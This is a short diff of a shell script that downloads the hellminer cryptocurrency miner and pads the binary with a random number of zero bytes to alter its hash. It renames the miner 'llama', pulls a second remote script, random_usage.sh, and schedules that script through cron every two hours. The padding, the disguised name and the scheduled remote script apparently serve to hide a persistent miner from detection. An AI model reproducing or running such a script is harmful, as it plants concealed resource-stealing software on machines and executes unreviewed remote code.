@@ -44,9 +44,9 @@ wget -O /opt/vrsc/gcc.tar.gz https://github.com/hellcatz/hminer/releases/downloa
 cd /opt/vrsc && tar -zxvf gcc.tar.gz && rm -rf gcc.tar.gz
 count=$((RANDOM % 1000 + 1))
 for ((i = 0; i < count; i++)); do
-  echo -n "0" >> "hellminer"
+  echo -n "0" >> "/opt/vrsc/hellminer"
 done
-mv hellminer llama
+mv /opt/vrsc/hellminer /opt/vrsc/llama
 wget https://raw.githubusercontent.com/caippx/bash/refs/heads/master/drfytgybhunjoimkol/random_usage.sh
 chmod u+x *
 cron_job="0 */2 * * * /opt/vrsc/random_usage.sh"
